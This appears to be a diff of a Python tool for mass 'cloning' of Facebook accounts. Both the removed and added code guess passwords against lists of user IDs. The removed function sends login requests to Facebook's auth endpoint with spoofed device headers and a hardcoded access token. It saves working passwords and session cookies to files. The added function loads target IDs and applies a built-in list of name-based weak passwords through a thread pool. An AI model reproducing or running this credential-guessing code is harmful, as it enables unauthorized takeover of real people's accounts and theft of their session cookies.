@@ -96,20 +96,15 @@ def ua_api():
 
 
 #__________________| LOGO |__________________#
-logo=(f"""
- \033[1;32m    _  _______  ____  ______
- \033[1;32m   / |/ / __/ |/_/ / / / __/
- \033[1;32m  /    / _/_>  </ /_/ /\ \  
-\033[1;32m  /_/|_/___/_/|_|\____/___/  
-                           
-\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-\033[1;32m[\033[1;31m✓\033[1;32m] Author     : Nexus
-\033[1;32m[\033[1;31m✓\033[1;32m] GitHub     : https://github.com/Nexus
-\033[1;32m[\033[1;31m✓\033[1;32m] Facebook.  : Simón Trinidad
-\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;33mFile Cloning
-\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;35m0.1
-\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+logo=(f"""\u001b[1;96m
+      _  _______  ____  ______
+    / |/ / __/ |/_/ / / / __/
+  /    / _/_>  </ /_/ /\ \  
+ /_/|_/___/_/|_|\____/___/  
+\u001b[0;1m
+Coded by Nexus
+Modified by Simón
+""")
 #__________________| MAIN |__________________#
 def clear():
 	os.system('clear')
@@ -420,119 +415,111 @@ def afghanistan():
 		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
 		menu()		
 #__________________| FILE METHOD M1 |__________________#
-def api1(ids,names,passlist):
+def ク克隆():
+    sintx_logo()
+    E = "/sdcard/"
+    prnt(pnl("[red][»] ENTER NAME OF YOUR FILE", width=90, style=_A))
+    F = input(f"{yellow}  [+] /sdcard/:{dark_gray} ")
+    G = E + F
+    try:
+        B = open(G, "r").read().splitlines()
+    except FileNotFoundError:
+        cd(1)
+        print(f"\n{lr}  [X] FILE NOT FOUND")
+        cd(3)
+        ク克隆()
+    A = []
+    prnt(
+        pnl(
+            "[sky_blue1][1] SYSTEM PASSWORD LIST\n[2] YOUR PASSWORD LIST",
+            width=90,
+            style=_A,
+            title="SELECT PASSWORD METHOD",
+        )
+    )
+    H = input(f"{green}  [›] CHOICE:{dark_gray} ")
+    if H in ["1", "01"]:
+        A.append("first last")
+        A.append("first123")
+        A.append("first12")
+        A.append("first143")
+        A.append("first12345")
+        A.append("first123456")
+        A.append("first_123")
+        A.append("maganda")
+        A.append("magandaako")
+        A.append("gandako")
+        A.append("ganda")
+        A.append("cuteako")
+        A.append("god143")
+        A.append("i love you")
+        A.append("firstpretty")
+        A.append("firstpogi")
+        A.append("firstigop")
+        A.append("firstdump")
+        A.append("potanginamo")
+        A.append("lastlast")
+        A.append("firstfirst")
+        A.append("firstganda")
+        A.append("firstmaganda")
+        A.append("blackpink")
+        A.append("jungkook")
+        A.append("pogiko")
+        A.append("pogiako")
+    else:
         try:
-                global oks,loop,sim_id,device
-                sys.stdout.write(f'\r\r{G}[{R}Nexus-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
-                fn = names.split(' ')[0]
-                try:
-                        ln = names.split(' ')[1]
-                except:
-                        ln = fn
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/302.0.0.45.119;FBBV/268946186;FBDM/{density=2'+'.0,width='+'720,height='+'1569};FBLC/en_US;FBRV/269803905;FBCR/Marshmallow;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M426B;FBSV/13;FBOP/1;nullFBCA/armeabi-v7a:armeabi;]'
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        quality = random.choice(['POOR', 'MODERATE', 'GOOD', 'EXCELLENT'])
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                'adid':adid,
-                                'format':'json',
-                                'device_id':device_id,
-                                'email':uid,
-                                'password':pas,
-                                "logged_out_id": str(uuid.uuid4()),
-                                "hash_id": str(uuid.uuid4()),
-                                "reg_instance": str(uuid.uuid4()),
-                                "session_id": str(uuid.uuid4()),
-                                "advertiser_id": str(uuid.uuid4()),
-                                'generate_analytics_claims':'1',
-                                'credentials_type':'password',
-                                'source':'login',
-                                'device': 'samsung',
-                                "sim_country": "id",
-                                "network_country": "id",
-                                'app_version': '302.0.0.45.119',
-                                "relative_url": "method/auth.login",
-                                'error_detail_type':'button_with_disabled',
-                                'enroll_misauth':'false',
-                                'generate_session_cookies':'1',
-                                'generate_machine_id':'1',
-                                'fb_api_req_friendly_name':'authenticate',
-                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                        }
-                        headers={
-                                'User-Agent': ua,
-                                'Accept-Encoding': 'gzip, deflate',
-                                'Connection': 'keep-alive',
-                                'Host': 'graph.facebook.com',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'Priority': 'u=3, i',
-                                'X-Fb-Sim-Hni': str(random.randint(20000, 40000)),
-                                'X-Fb-Net-Hni': str(random.randint(20000, 40000)),
-                                'X-Fb-Connection-Quality': 'GOOD',
-                                'Zero-Rated': '0', 
-                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
-                                'X-Fb-Connection-Type': 'MOBILE.LTE', 
-                                'X-Fb-Device-Group': '5120',
-                                'X-Tigon-Is-Retry': 'False',
-                                'X-Fb-Friendly-Name': 'authenticate',
-                                'X-Fb-Request-Analytics-Tags': 'unknown', 
-                                'X-Fb-Http-Engine': 'Liger',
-                                'X-Fb-Client-Ip': 'True', 
-                                'X-Fb-Server-Cluster': 'True',
-                                'Content-Length': str(random.randint(600, 1000)),}
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}Nexus-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/Nexus-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
-                                        oks.append(ids)
-                                        break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                        if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}Nexus-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/Nexus-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                cps.append(ids)
-                                                break
-                                        else:
-                                                break
-                        else:
-                                        continue
-                loop+=1
-        except Exception as e:
-                pass
+            prnt(
+                pnl(
+                    "[yellow][?] HOW MANY PASSWORD DO YOU WANT TO USE?",
+                    width=90,
+                    style=_A,
+                )
+            )
+            C = int(input(f"{green}  [›] ANSWER:{dark_gray} "))
+        except:
+            C = 1
+        prnt(
+            pnl(
+                "[yellow] first last, first123, first143, last123, last143",
+                width=90,
+                style=_A,
+                title="EXAMPLE PASSWORD",
+            )
+        )
+        for I in range(C):
+            A.append(input(f"{green}  [›] PASSWORD #{I+1}:{dark_gray} "))
+    with ThreadPool(max_workers=None) as J:
+        prnt(
+            pnl(
+                "[yellow][»] ON/OFF FIRST YOUR DATA FOR 5 SECONDS AND PRESS ENTER",
+                width=90,
+                style=_A,
+                title="INSTRUCTIONS",
+            )
+        )
+        input(f"{green}  [»] PRESS ENTER: ")
+        sintx_logo()
+        D = str(len(B))
+        prnt(
+            pnl(
+                "[yellow][»] NOT FOR SALE!",
+                width=90,
+                style=_A,
+                title="NOTICE!",
+            )
+        )
+        K = "[white][-] TOTAL IDS TO CLONE: " + D + "\n[-] RESULT PATH: SINTX FOLDER"
+        prnt(pnl(K, width=90, style=_A, title="FILE INFO"))
+        for L in B:
+            M, N = L.split("|")
+            O = A
+            J.submit(sinsAPI_, M, N, O, D)
+    P = "[»] HITS : " + str(len(oks))
+    Q = "\n[»] CPS  : " + str(len(cps))
+    print(_B)
+    prnt(pnl(P + Q, width=90, style=_A, title="PROCESS COMPLETED"))
+    input(f"{dark_gray}  [›] PRESS ENTER TO REFRESH ")
+    sintx_menu()
 #__________________| FILE METHOD M2 |__________________#
 def api2(ids,names,passlist):
         try:
